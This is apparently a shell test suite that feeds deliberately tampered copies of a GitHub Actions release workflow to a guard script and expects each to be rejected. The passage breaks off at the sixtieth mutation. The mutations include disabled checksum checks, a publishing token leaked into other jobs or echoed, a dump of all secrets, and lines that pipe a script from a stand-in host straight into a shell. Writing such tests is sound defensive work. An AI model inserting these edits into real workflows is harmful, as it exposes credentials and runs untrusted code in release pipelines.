#!/bin/sh
# Automated regression test suite for scripts/check-release-workflow.sh.
# Verifies that check-release-workflow.sh rejects unauthorized workflow modifications
# with clear error messages (never crashing with unhandled exceptions) while accepting
# valid workflow configurations.
set -eu

script_dir=$(CDPATH= cd "$(dirname "$0")" && pwd)
repo_root=$(CDPATH= cd "$script_dir/.." && pwd)
check_script="$repo_root/scripts/check-release-workflow.sh"
orig_workflow="$repo_root/.github/workflows/release.yml"

tmpdir=$(mktemp -d)
trap 'rm -rf "$tmpdir"' EXIT

failed_count=0
passed_count=0
skipped_count=0

assert_mutation_fails() {
  mut_id="$1"
  mut_desc="$2"
  test_file="$3"
  err_log="$tmpdir/${mut_id}.err"

  if "$check_script" "$test_file" >/dev/null 2>"$err_log"; then
    printf 'FAIL | %-42s | %s (survived guard!)\n' "$mut_id" "$mut_desc" >&2
    failed_count=$((failed_count + 1))
  elif grep -q "Traceback (most recent call last)" "$err_log"; then
    printf 'FAIL | %-42s | %s (crashed with Python traceback!)\n' "$mut_id" "$mut_desc" >&2
    cat "$err_log" >&2
    failed_count=$((failed_count + 1))
  elif ! grep -q "ERROR:" "$err_log"; then
    printf 'FAIL | %-42s | %s (missing ERROR message!)\n' "$mut_id" "$mut_desc" >&2
    cat "$err_log" >&2
    failed_count=$((failed_count + 1))
  else
    printf 'PASS | %-42s | %s\n' "$mut_id" "$mut_desc"
    passed_count=$((passed_count + 1))
  fi
}

assert_pwsh_mutation_fails() {
  mut_id="$1"
  mut_desc="$2"
  test_file="$3"

  if ! command -v pwsh >/dev/null 2>&1; then
    ci_val="${CI:-}"
    if [ -z "$ci_val" ] || [ "$ci_val" = "false" ] || [ "$ci_val" = "0" ]; then
      printf 'SKIP | %-42s | %s (pwsh not found on PATH; skipping)\n' "$mut_id" "$mut_desc"
      skipped_count=$((skipped_count + 1))
      return 0
    else
      printf 'FAIL | %-42s | %s (pwsh required in CI to validate PowerShell steps)\n' "$mut_id" "$mut_desc" >&2
      failed_count=$((failed_count + 1))
      return 0
    fi
  fi

  assert_mutation_fails "$mut_id" "$mut_desc" "$test_file"
}

assert_control_passes() {
  ctrl_id="$1"
  ctrl_desc="$2"
  test_file="$3"
  out_log="$tmpdir/${ctrl_id}.out"

  if "$check_script" "$test_file" >"$out_log" 2>&1; then
    printf 'PASS | %-42s | %s\n' "$ctrl_id" "$ctrl_desc"
    passed_count=$((passed_count + 1))
  else
    printf 'FAIL | %-42s | %s (control check failed!)\n' "$ctrl_id" "$ctrl_desc" >&2
    cat "$out_log" >&2
    failed_count=$((failed_count + 1))
  fi
}

apply_replace() {
  mut_id="$1"
  mut_desc="$2"
  old_str="$3"
  new_str="$4"
  mut_file="$tmpdir/${mut_id}.yml"

  python3 - "$orig_workflow" "$mut_file" "$old_str" "$new_str" << 'PYEOF'
import sys
orig_path, mut_path, old_str, new_str = sys.argv[1:5]
with open(orig_path, 'r', encoding='utf-8') as f:
    orig = f.read()
if old_str not in orig:
    sys.exit(f"Target string not found in workflow: {old_str!r}")
mutated = orig.replace(old_str, new_str, 1)
if mutated == orig:
    sys.exit(f"Replacement resulted in identical content for {mut_path}")
with open(mut_path, 'w', encoding='utf-8') as f:
    f.write(mutated)
PYEOF

  assert_mutation_fails "$mut_id" "$mut_desc" "$mut_file"
}

apply_pwsh_replace() {
  mut_id="$1"
  mut_desc="$2"
  old_str="$3"
  new_str="$4"
  mut_file="$tmpdir/${mut_id}.yml"

  python3 - "$orig_workflow" "$mut_file" "$old_str" "$new_str" << 'PYEOF'
import sys
orig_path, mut_path, old_str, new_str = sys.argv[1:5]
with open(orig_path, 'r', encoding='utf-8') as f:
    orig = f.read()
if old_str not in orig:
    sys.exit(f"Target string not found in workflow: {old_str!r}")
mutated = orig.replace(old_str, new_str, 1)
if mutated == orig:
    sys.exit(f"Replacement resulted in identical content for {mut_path}")
with open(mut_path, 'w', encoding='utf-8') as f:
    f.write(mutated)
PYEOF

  assert_pwsh_mutation_fails "$mut_id" "$mut_desc" "$mut_file"
}

apply_publish_crates_replace() {
  mut_id="$1"
  mut_desc="$2"
  old_str="$3"
  new_str="$4"
  mut_file="$tmpdir/${mut_id}.yml"

  python3 - "$repo_root/.github/workflows/publish-crates.yml" "$mut_file" "$old_str" "$new_str" << 'PYEOF'
import sys
orig_path, mut_path, old_str, new_str = sys.argv[1:5]
with open(orig_path, 'r', encoding='utf-8') as f:
    orig = f.read()
if old_str not in orig:
    sys.exit(f"Target string not found in publish-crates: {old_str!r}")
mutated = orig.replace(old_str, new_str, 1)
if mutated == orig:
    sys.exit(f"Replacement resulted in identical content for {mut_path}")
with open(mut_path, 'w', encoding='utf-8') as f:
    f.write(mutated)
PYEOF

  err_log="$tmpdir/${mut_id}.err"
  if "$check_script" "$orig_workflow" "$mut_file" >/dev/null 2>"$err_log"; then
    printf 'FAIL | %-42s | %s (survived guard!)\n' "$mut_id" "$mut_desc" >&2
    failed_count=$((failed_count + 1))
  elif grep -q "Traceback (most recent call last)" "$err_log"; then
    printf 'FAIL | %-42s | %s (crashed with Python traceback!)\n' "$mut_id" "$mut_desc" >&2
    cat "$err_log" >&2
    failed_count=$((failed_count + 1))
  elif ! grep -q "ERROR:" "$err_log"; then
    printf 'FAIL | %-42s | %s (missing ERROR message!)\n' "$mut_id" "$mut_desc" >&2
    cat "$err_log" >&2
    failed_count=$((failed_count + 1))
  else
    printf 'PASS | %-42s | %s\n' "$mut_id" "$mut_desc"
    passed_count=$((passed_count + 1))
  fi
}

apply_replace_all() {
  mut_id="$1"
  mut_desc="$2"
  old_str="$3"
  new_str="$4"
  mut_file="$tmpdir/${mut_id}.yml"

  python3 - "$orig_workflow" "$mut_file" "$old_str" "$new_str" << 'PYEOF'
import sys
orig_path, mut_path, old_str, new_str = sys.argv[1:5]
with open(orig_path, 'r', encoding='utf-8') as f:
    orig = f.read()
if old_str not in orig:
    sys.exit(f"Target string not found in workflow: {old_str!r}")
mutated = orig.replace(old_str, new_str)
if mutated == orig:
    sys.exit(f"Replacement resulted in identical content for {mut_path}")
with open(mut_path, 'w', encoding='utf-8') as f:
    f.write(mutated)
PYEOF

  assert_mutation_fails "$mut_id" "$mut_desc" "$mut_file"
}

echo "=== Baseline Test: Unmutated workflow ==="
assert_control_passes "baseline-unmutated" "Unmutated release.yml passes all checks" "$orig_workflow"

echo ""
echo "=== Verification Step Mutations ==="

# 1. dist binary executed before shasum in build-local Unix step
apply_replace "dist-version-before-shasum" "Unix build step: run dist --version before shasum" \
  'echo "${EXPECTED_SHA}  ${DIST_ARCHIVE}" | shasum -a 256 -c -' \
  'dist --version
          echo "${EXPECTED_SHA}  ${DIST_ARCHIVE}" | shasum -a 256 -c -'

# 2. ARM dist hash replaced with zeros
apply_replace "arm-dist-hash-zeros" "ARM dist hash replaced with zeros" \
  '4761cff5fc547ad66d1449abbf321380b0e6bd8093b1fe6593852a3314fd0c19' \
  '0000000000000000000000000000000000000000000000000000000000000000'

# 3. Windows step throw check removed
apply_replace "windows-throw-removed" "Windows step: throw check removed" \
  '          if ($actualHash -ne $expectedHash) {
            throw "SHA-256 mismatch for ${archive}: expected $expectedHash, got $actualHash"
          }' \
  '          # check removed'

# 4. Windows throw replaced by Write-Host
apply_replace "windows-throw-replaced-write-host" "Windows throw replaced by Write-Host" \
  'throw "SHA-256 mismatch' \
  'Write-Host "SHA-256 mismatch'

# 5. Delete dist shasum line
apply_replace "dist-shasum-line-deleted" "Delete dist shasum line" \
  '          echo "${EXPECTED_SHA}  ${DIST_ARCHIVE}" | shasum -a 256 -c -' \
  '          # shasum check deleted'

# 6. Append || true to shasum line
apply_replace_all "shasum-line-masked-or-true" "Append || true to shasum line" \
  'shasum -a 256 -c -' \
  'shasum -a 256 -c - || true'

# 7. Delete cyclonedx shasum line
apply_replace "cyclonedx-shasum-deleted" "Delete cyclonedx shasum line" \
  '          echo "${EXPECTED_SHA}  /tmp/cyclonedx.tar.xz" | shasum -a 256 -c -' \
  '          # cyclonedx check deleted'

# 8. CycloneDX hash replaced with zeros
apply_replace "cyclonedx-hash-zeros" "CycloneDX hash replaced with zeros" \
  '9bd3e599314f50810c9d98b8b68a617ff9d3cc20873968d90b29d121f6b226ff' \
  '0000000000000000000000000000000000000000000000000000000000000000'

# 9. set +e added to Install dist (Unix)
apply_replace "install-dist-set-plus-e" "set +e added to Install dist (Unix)" \
  '      - name: Install dist (Unix)
        if: runner.os != '\''Windows'\''
        shell: bash
        run: |' \
  '      - name: Install dist (Unix)
        if: runner.os != '\''Windows'\''
        shell: bash
        run: |
          set +e'

# 10. Hash mismatch in build-local Unix step only
apply_replace "hash-mismatch-build-local" "x86_64 hash changed in build-local Unix step only" \
  '          else
            DIST_ARCHIVE="cargo-dist-x86_64-unknown-linux-musl.tar.xz"
            EXPECTED_SHA="b8e95bc76c63375958173ef5ae2dbd8e9211cc1ed03cdee0899702766b4c2a2e"' \
  '          else
            DIST_ARCHIVE="cargo-dist-x86_64-unknown-linux-musl.tar.xz"
            EXPECTED_SHA="08e95bc76c63375958173ef5ae2dbd8e9211cc1ed03cdee0899702766b4c2a2e"'

# 11. Windows hash changed with original kept in trailing comment
apply_replace "hash-hidden-in-comment" "Windows hash changed; original in trailing comment" \
  '$expectedHash = "9a36d70795e14326a5ec4bf17aee085df00ab85a322739291ea5d4b1b5f693cd"' \
  '$expectedHash = "0a36d70795e14326a5ec4bf17aee085df00ab85a322739291ea5d4b1b5f693cd" # 9a36d70795e14326a5ec4bf17aee085df00ab85a322739291ea5d4b1b5f693cd'

# 12. shasum -a 256 without -c flag
apply_replace_all "verify-command-without-check-flag" "shasum without -c flag" \
  'shasum -a 256 -c -' \
  'shasum -a 256'

# 13. CycloneDX verify masked with || echo skipped
apply_replace "cyclonedx-verify-masked-or-echo" "CycloneDX verify masked with || echo skipped" \
  'echo "${EXPECTED_SHA}  /tmp/cyclonedx.tar.xz" | shasum -a 256 -c -' \
  'echo "${EXPECTED_SHA}  /tmp/cyclonedx.tar.xz" | shasum -a 256 -c - || echo skipped'

# 14. Windows actualHash overwritten before comparison
apply_replace "windows-hash-assigned-before-check" "Windows actualHash overwritten before check" \
  '          if ($actualHash -ne $expectedHash) {' \
  '          $actualHash = $expectedHash
          if ($actualHash -ne $expectedHash) {'

# 15. Decoy step with duplicate name and if: false
apply_replace "decoy-step-duplicate-name" "Decoy step with duplicate name and if: false" \
  '      - name: Install dist (Unix)' \
  '      - name: Install dist (Unix)
        if: false
      - name: Install dist (Unix)'

# 16. if: false on plan Install dist
apply_replace "plan-install-dist-if-false" "if: false on plan Install dist" \
  '      - name: Install dist
        shell: bash' \
  '      - name: Install dist
        if: false
        shell: bash'

# 17. continue-on-error: true on Install dist (Unix)
apply_replace "install-dist-continue-on-error" "continue-on-error: true on Install dist (Unix)" \
  '      - name: Install dist (Unix)
        if: runner.os != '\''Windows'\''' \
  '      - name: Install dist (Unix)
        continue-on-error: true
        if: runner.os != '\''Windows'\'''

# 18. Comment-only hash in plan dist
apply_replace "comment-only-hash" "Expected hash only in comment; corrupted hash in variable" \
  '          EXPECTED_SHA="b8e95bc76c63375958173ef5ae2dbd8e9211cc1ed03cdee0899702766b4c2a2e"' \
  '          # b8e95bc76c63375958173ef5ae2dbd8e9211cc1ed03cdee0899702766b4c2a2e
          EXPECTED_SHA="0000000000000000000000000000000000000000000000000000000000000000"'

# 19. Verify command masked with || echo ok
apply_replace "verify-command-masked-with-or-echo" "Verify line masked with || echo ok" \
  'echo "${EXPECTED_SHA}  ${DIST_ARCHIVE}" | shasum -a 256 -c -' \
  'echo "${EXPECTED_SHA}  ${DIST_ARCHIVE}" | shasum -a 256 -c - || echo ok'

# 20. Install dist (Unix) step with if: false
apply_replace "install-dist-step-if-false" "Install dist (Unix) replaced with if: false" \
  '      - name: Install dist (Unix)
        if: runner.os != '\''Windows'\''' \
  '      - name: Install dist (Unix)
        if: false'

echo ""
echo "=== Token Isolation Mutations ==="

# 21. Token moved to prepare job brew step
mut_file="$tmpdir/token-in-prepare-job-brew-step.yml"
python3 - "$orig_workflow" "$mut_file" << 'PYEOF'
import sys
with open(sys.argv[1], 'r', encoding='utf-8') as f:
    text = f.read()
# Add to brew step
text = text.replace(
    '      - name: Format formula with brew\n        shell: bash',
    '      - name: Format formula with brew\n        shell: bash\n        env:\n          HOMEBREW_TAP_TOKEN: ${{ secrets.HOMEBREW_TAP_TOKEN }}'
)
# Remove from Push formula
text = text.replace('          HOMEBREW_TAP_TOKEN: ${{ secrets.HOMEBREW_TAP_TOKEN }}\n', '')
with open(sys.argv[2], 'w', encoding='utf-8') as f:
    f.write(text)
PYEOF
assert_mutation_fails "token-in-prepare-job-brew-step" "HOMEBREW_TAP_TOKEN moved to prepare job brew step" "$mut_file"

# 22. Token moved to publish job-level env
mut_file="$tmpdir/token-in-publish-job-env.yml"
python3 - "$orig_workflow" "$mut_file" << 'PYEOF'
import sys
with open(sys.argv[1], 'r', encoding='utf-8') as f:
    text = f.read()
text = text.replace(
    '    env:\n      GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}',
    '    env:\n      GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n      HOMEBREW_TAP_TOKEN: ${{ secrets.HOMEBREW_TAP_TOKEN }}'
)
text = text.replace('          HOMEBREW_TAP_TOKEN: ${{ secrets.HOMEBREW_TAP_TOKEN }}\n', '')
with open(sys.argv[2], 'w', encoding='utf-8') as f:
    f.write(text)
PYEOF
assert_mutation_fails "token-in-publish-job-env" "Token moved to publish job-level env" "$mut_file"

# 23. Token on commit step instead of push step
mut_file="$tmpdir/token-on-commit-step.yml"
python3 - "$orig_workflow" "$mut_file" << 'PYEOF'
import sys
with open(sys.argv[1], 'r', encoding='utf-8') as f:
    text = f.read()
text = text.replace(
    '      - name: Commit formula files\n        shell: bash',
    '      - name: Commit formula files\n        shell: bash\n        env:\n          HOMEBREW_TAP_TOKEN: ${{ secrets.HOMEBREW_TAP_TOKEN }}'
)
text = text.replace('          HOMEBREW_TAP_TOKEN: ${{ secrets.HOMEBREW_TAP_TOKEN }}\n', '')
with open(sys.argv[2], 'w', encoding='utf-8') as f:
    f.write(text)
PYEOF
assert_mutation_fails "token-on-commit-step" "Token on commit step instead of push step" "$mut_file"

# 24. Token moved to actions/checkout step env
mut_file="$tmpdir/token-in-checkout-env.yml"
python3 - "$orig_workflow" "$mut_file" << 'PYEOF'
import sys
with open(sys.argv[1], 'r', encoding='utf-8') as f:
    text = f.read()
text = text.replace(
    '      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n        with:\n          persist-credentials: false\n          repository: "bavanchun/homebrew-tap"',
    '      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n        env:\n          HOMEBREW_TAP_TOKEN: ${{ secrets.HOMEBREW_TAP_TOKEN }}\n        with:\n          persist-credentials: false\n          repository: "bavanchun/homebrew-tap"'
)
text = text.replace('          HOMEBREW_TAP_TOKEN: ${{ secrets.HOMEBREW_TAP_TOKEN }}\n', '')
with open(sys.argv[2], 'w', encoding='utf-8') as f:
    f.write(text)
PYEOF
assert_mutation_fails "token-in-checkout-env" "Token moved to actions/checkout step env" "$mut_file"

# 25. A second job (announce) gains HOMEBREW_TAP_TOKEN
apply_replace "token-in-second-job-announce" "A second job (announce) gains HOMEBREW_TAP_TOKEN" \
  '  announce:
    needs:
      - plan
      - host
      - prepare-homebrew-formula
      - publish-homebrew-formula
      - custom-publish-crates
    # use "always() && ..." to allow us to wait for all publish jobs while
    # still allowing individual publish jobs to skip themselves (for prereleases).
    # "host" however must run to completion, no skipping allowed!
    if: ${{ always() && needs.host.result == '\''success'\'' && (needs.publish-homebrew-formula.result == '\''skipped'\'' || needs.publish-homebrew-formula.result == '\''success'\'') && (needs.custom-publish-crates.result == '\''skipped'\'' || needs.custom-publish-crates.result == '\''success'\'') }}
    runs-on: "ubuntu-26.04"
    permissions:
      contents: read
    env:
      GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}' \
  '  announce:
    needs:
      - plan
      - host
      - prepare-homebrew-formula
      - publish-homebrew-formula
      - custom-publish-crates
    # use "always() && ..." to allow us to wait for all publish jobs while
    # still allowing individual publish jobs to skip themselves (for prereleases).
    # "host" however must run to completion, no skipping allowed!
    if: ${{ always() && needs.host.result == '\''success'\'' && (needs.publish-homebrew-formula.result == '\''skipped'\'' || needs.publish-homebrew-formula.result == '\''success'\'') && (needs.custom-publish-crates.result == '\''skipped'\'' || needs.custom-publish-crates.result == '\''success'\'') }}
    runs-on: "ubuntu-26.04"
    permissions:
      contents: read
    env:
      GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
      HOMEBREW_TAP_TOKEN: ${{ secrets.HOMEBREW_TAP_TOKEN }}'

# 26. Add HOMEBREW_TAP_TOKEN literal definition to job env block
apply_replace "token-in-job-env-block" "Add HOMEBREW_TAP_TOKEN to job env block" \
  '  publish-homebrew-formula:
    needs:
      - plan
      - host
      - prepare-homebrew-formula
    environment: "release"
    runs-on: "ubuntu-26.04"
    permissions:
      contents: read
    env:
      GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}' \
  '  publish-homebrew-formula:
    needs:
      - plan
      - host
      - prepare-homebrew-formula
    environment: "release"
    runs-on: "ubuntu-26.04"
    permissions:
      contents: read
    env:
      GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
      HOMEBREW_TAP_TOKEN: dummy'

# 27. token bracket-quoted on checkout step
apply_replace "token-bracket-quoted-on-checkout" "token: secrets['HOMEBREW_TAP_TOKEN'] on checkout" \
  'repository: "bavanchun/homebrew-tap"' \
  'repository: "bavanchun/homebrew-tap"
          token: ${{ secrets['\''HOMEBREW_TAP_TOKEN'\''] }}'

# 28. token bracket-double-quoted in job env
apply_replace "token-bracket-double-quoted" "token: secrets[\"HOMEBREW_TAP_TOKEN\"] in job env" \
  '    env:
      GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
      PLAN: ${{ needs.plan.outputs.val }}' \
  '    env:
      GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
      PLAN: ${{ needs.plan.outputs.val }}
      TOKEN: ${{ secrets["HOMEBREW_TAP_TOKEN"] }}'

# 29. echo token in run text
apply_replace "token-echo-in-run" "echo token in run text" \
  '      - name: Commit formula files
        run: |' \
  '      - name: Commit formula files
        run: |
          echo "${{ secrets['\''HOMEBREW_TAP_TOKEN'\''] }}"'

# 30. token in job-level env with alternative var name
apply_replace "token-job-level-env" "Publish job-level env: TAP: secrets['HOMEBREW_TAP_TOKEN']" \
  '    env:
      GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
      PLAN: ${{ needs.plan.outputs.val }}' \
  '    env:
      GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
      PLAN: ${{ needs.plan.outputs.val }}
      TAP: ${{ secrets['\''HOMEBREW_TAP_TOKEN'\''] }}'

# 31. ALL: toJSON(secrets) in prepare job env
apply_replace "secrets-tojson-in-job-env" "ALL: toJSON(secrets) in prepare job env" \
  '  prepare-homebrew-formula:
    needs:
      - plan
      - host
    runs-on: "ubuntu-26.04"
    permissions:
      contents: read
    env:
      PLAN: ${{ needs.plan.outputs.val }}' \
  '  prepare-homebrew-formula:
    needs:
      - plan
      - host
    runs-on: "ubuntu-26.04"
    permissions:
      contents: read
    env:
      PLAN: ${{ needs.plan.outputs.val }}
      ALL: ${{ toJSON(secrets) }}'

# 32. Push step renamed
apply_replace "push-step-renamed" "Push formula step renamed" \
  'name: Push formula' \
  'name: Publish formula'

# 33. YAML anchor on Push env aliased into announce
mut_file="$tmpdir/env-yaml-anchor-aliased.yml"
python3 - "$orig_workflow" "$mut_file" << 'PYEOF'
import sys
with open(sys.argv[1], 'r', encoding='utf-8') as f:
    text = f.read()
text = text.replace(
    '        env:\n          HOMEBREW_TAP_TOKEN: ${{ secrets.HOMEBREW_TAP_TOKEN }}',
    '        env: &tap_env\n          HOMEBREW_TAP_TOKEN: ${{ secrets.HOMEBREW_TAP_TOKEN }}'
)
announce_target = """  announce:
    needs:
      - plan
      - host
      - prepare-homebrew-formula
      - publish-homebrew-formula
      - custom-publish-crates
    # use "always() && ..." to allow us to wait for all publish jobs while
    # still allowing individual publish jobs to skip themselves (for prereleases).
    # "host" however must run to completion, no skipping allowed!
    if: ${{ always() && needs.host.result == 'success' && (needs.publish-homebrew-formula.result == 'skipped' || needs.publish-homebrew-formula.result == 'success') && (needs.custom-publish-crates.result == 'skipped' || needs.custom-publish-crates.result == 'success') }}
    runs-on: "ubuntu-26.04"
    permissions:
      contents: read
    env:
      GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
    steps:"""
announce_replacement = announce_target + """
      - name: Leak step
        env: *tap_env
        run: echo leak"""
text = text.replace(announce_target, announce_replacement)
with open(sys.argv[2], 'w', encoding='utf-8') as f:
    f.write(text)
PYEOF
assert_mutation_fails "env-yaml-anchor-aliased" "YAML anchor on Push env aliased into announce" "$mut_file"

# 34. Flow-style env on Commit step
apply_replace "token-flow-style-env" "Flow-style env on Commit step referencing token" \
  '      - name: Commit formula files
        run: |' \
  '      - name: Commit formula files
        env: {T: "${{ secrets['\''HOMEBREW_TAP_TOKEN'\''] }}"}
        run: |'

# 35. Token in step with input
apply_replace "token-in-step-with-input" "Token passed to with: input of step" \
  '      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false
          repository: "bavanchun/homebrew-tap"' \
  '      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false
          repository: "bavanchun/homebrew-tap"
          token: ${{ secrets.HOMEBREW_TAP_TOKEN }}'

echo ""
echo "=== Permissions and Environment Mutations ==="

# 36. prepare-homebrew-formula gets contents: write
apply_replace "prepare-job-contents-write" "prepare-homebrew-formula gets contents: write" \
  '  prepare-homebrew-formula:
    needs:
      - plan
      - host
    runs-on: "ubuntu-26.04"
    permissions:
      contents: read' \
  '  prepare-homebrew-formula:
    needs:
      - plan
      - host
    runs-on: "ubuntu-26.04"
    permissions:
      contents: write'

# 37. Top level adds id-token: write and actions: write
apply_replace "top-level-permissions-widened" "Top level adds id-token: write and actions: write" \
  'permissions:
  contents: read' \
  'permissions:
  contents: read
  id-token: write
  actions: write'

# 38. Workflow-level contents: write
apply_replace "workflow-contents-write" "Workflow-level permissions contents: write" \
  'permissions:
  contents: read' \
  'permissions:
  contents: write'

# 39. Permissions widened on publish-homebrew-formula (packages: write)
apply_replace "publish-job-permissions-widened" "Permissions widened on publish job (packages: write)" \
  '  publish-homebrew-formula:
    needs:
      - plan
      - host
      - prepare-homebrew-formula
    environment: "release"
    runs-on: "ubuntu-26.04"
    permissions:
      contents: read' \
  '  publish-homebrew-formula:
    needs:
      - plan
      - host
      - prepare-homebrew-formula
    environment: "release"
    runs-on: "ubuntu-26.04"
    permissions:
      contents: read
      packages: write'

# 40. environment: release removed from publish job
apply_replace "environment-release-removed" "environment: release removed from publish job" \
  '    environment: "release"
' \
  ''

# 41. Drop environment to development
apply_replace "environment-downgraded-dev" "Drop environment to development" \
  'environment: "release"' \
  'environment: "development"'

# 42. environment: staging
apply_replace "environment-staging" "environment changed to staging" \
  'environment: "release"' \
  'environment: "staging"'

# 43. permissions: write-all on prepare job
apply_replace "permissions-write-all" "permissions: write-all on prepare job" \
  '  prepare-homebrew-formula:
    needs:
      - plan
      - host
    runs-on: "ubuntu-26.04"
    permissions:
      contents: read' \
  '  prepare-homebrew-formula:
    needs:
      - plan
      - host
    runs-on: "ubuntu-26.04"
    permissions: write-all'

# 44. announce contents: 'write' (quoted)
apply_replace "announce-contents-write-quoted" "announce job contents: 'write' (quoted)" \
  '  announce:
    needs:
      - plan
      - host
      - prepare-homebrew-formula
      - publish-homebrew-formula
      - custom-publish-crates
    # use "always() && ..." to allow us to wait for all publish jobs while
    # still allowing individual publish jobs to skip themselves (for prereleases).
    # "host" however must run to completion, no skipping allowed!
    if: ${{ always() && needs.host.result == '\''success'\'' && (needs.publish-homebrew-formula.result == '\''skipped'\'' || needs.publish-homebrew-formula.result == '\''success'\'') && (needs.custom-publish-crates.result == '\''skipped'\'' || needs.custom-publish-crates.result == '\''success'\'') }}
    runs-on: "ubuntu-26.04"
    permissions:
      contents: read' \
  '  announce:
    needs:
      - plan
      - host
      - prepare-homebrew-formula
      - publish-homebrew-formula
      - custom-publish-crates
    # use "always() && ..." to allow us to wait for all publish jobs while
    # still allowing individual publish jobs to skip themselves (for prereleases).
    # "host" however must run to completion, no skipping allowed!
    if: ${{ always() && needs.host.result == '\''success'\'' && (needs.publish-homebrew-formula.result == '\''skipped'\'' || needs.publish-homebrew-formula.result == '\''success'\'') && (needs.custom-publish-crates.result == '\''skipped'\'' || needs.custom-publish-crates.result == '\''success'\'') }}
    runs-on: "ubuntu-26.04"
    permissions:
      contents: '\''write'\'''

echo ""
echo "=== Action Pinning and Checkout Security Mutations ==="

# 45. persist-credentials deleted on tap checkout
apply_replace "persist-credentials-deleted" "persist-credentials deleted on tap checkout" \
  '      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false
          repository: "bavanchun/homebrew-tap"' \
  '      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          repository: "bavanchun/homebrew-tap"'

# 46. persist-credentials: 'true' quoted
apply_replace_all "persist-credentials-quoted-true" "persist-credentials: 'true' quoted" \
  'persist-credentials: false' \
  "persist-credentials: 'true'"

# 47. persist-credentials: true on checkout
apply_replace_all "checkout-persist-credentials-true" "persist-credentials: true on checkout" \
  'persist-credentials: false' \
  'persist-credentials: true'

# 48. actions/checkout@v7 unpinned tag
apply_replace_all "unpinned-checkout-tag" "actions/checkout@v7 unpinned tag" \
  'actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1' \
  'actions/checkout@v7'

# 49. cargo-auditable unpinned without @x.y.z
apply_replace "cargo-auditable-unpinned" "cargo-auditable unpinned without @x.y.z" \
  'tool: cargo-auditable@0.7.7' \
  'tool: cargo-auditable'

# 50. Plan checkout persist-credentials: "false" (string)
apply_replace "checkout-persist-credentials-string" "Plan checkout persist-credentials: \"false\" (string)" \
  '      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false
          submodules: recursive' \
  '      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: "false"
          submodules: recursive'

# 51. New job with tag-pinned uses
mut_file="$tmpdir/job-uses-unpinned-tag.yml"
python3 - "$orig_workflow" "$mut_file" << 'PYEOF'
import sys
with open(sys.argv[1], 'r', encoding='utf-8') as f:
    text = f.read()
text += "\n  decoy:\n    uses: actions/checkout@v4\n"
with open(sys.argv[2], 'w', encoding='utf-8') as f:
    f.write(text)
PYEOF
assert_mutation_fails "job-uses-unpinned-tag" "New job with tag-pinned uses: actions/checkout@v4" "$mut_file"

# 52. Capitalized Actions/Checkout with persist-credentials: true
apply_replace "checkout-capitalized-uses-credentials-true" "Actions/Checkout@sha with persist-credentials: true" \
  '      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false' \
  '      - uses: Actions/Checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: true'

# 53. Push formula gets unpinned action
apply_replace "push-formula-unpinned-action" "Push formula gets unpinned action" \
  '      - name: Push formula' \
  '      - name: Push formula
        uses: ad-m/github-push-action@v0.8.0'

echo ""
echo "=== Installer, Shell, and Structural Mutations ==="

# 54. curl ... | /bin/sh added to announce
apply_replace "pipe-to-bin-sh-in-announce" "curl ... | /bin/sh added to announce" \
  '    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1' \
  '    steps:
      - run: curl -sSf https://example.com/bad | /bin/sh
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1'

# 55. curl -o x.sh ... && bash x.sh added
apply_replace "unverified-script-execution" "curl -o x.sh ... && bash x.sh added" \
  '    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1' \
  '    steps:
      - run: curl -o x.sh https://example.com/bad.sh && bash x.sh
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1'

# 56. brew update added to publish job
apply_replace "brew-update-in-publish-job" "brew update added to publish job" \
  '      - name: Fetch prepared formula' \
  '      - run: brew update
      - name: Fetch prepared formula'

# 57. matrix['install_dist'].run expression added
apply_replace "matrix-install-dist-expression" "matrix['install_dist'].run expression added" \
  '      - name: Install dist (Unix)
        if: runner.os != '\''Windows'\''
        shell: bash
        run: |' \
  '      - name: Install dist (Unix)
        if: runner.os != '\''Windows'\''
        shell: bash
        run: |
          echo "${{ matrix['\''install_dist'\''].run }}"'

# 58. Restore curl ... | sh in plan job
apply_replace "plan-curl-pipe-sh" "Restore curl ... | sh in plan job" \
  '          tar -xJf "$DIST_ARCHIVE" --strip-components=1 -C ~/.cargo/bin "${DIST_ARCHIVE%.tar.xz}/dist"
          chmod +x ~/.cargo/bin/dist' \
  '          curl -sSf https://example.com/dist | sh'

# 59. Run sh file without verified checksum
apply_replace "run-sh-without-checksum" "Run sh file without verified checksum" \
  '          tar -xJf "$DIST_ARCHIVE" --strip-components=1 -C ~/.cargo/bin "${DIST_ARCHIVE%.tar.xz}/dist"
          chmod +x ~/.cargo/bin/dist' \
  '          sh /tmp/install.sh'

# 60. Build artifacts step missing shell: bash
apply_replace "build-artifacts-missing-shell-bash" "Build artifacts step missing shell: bash" \
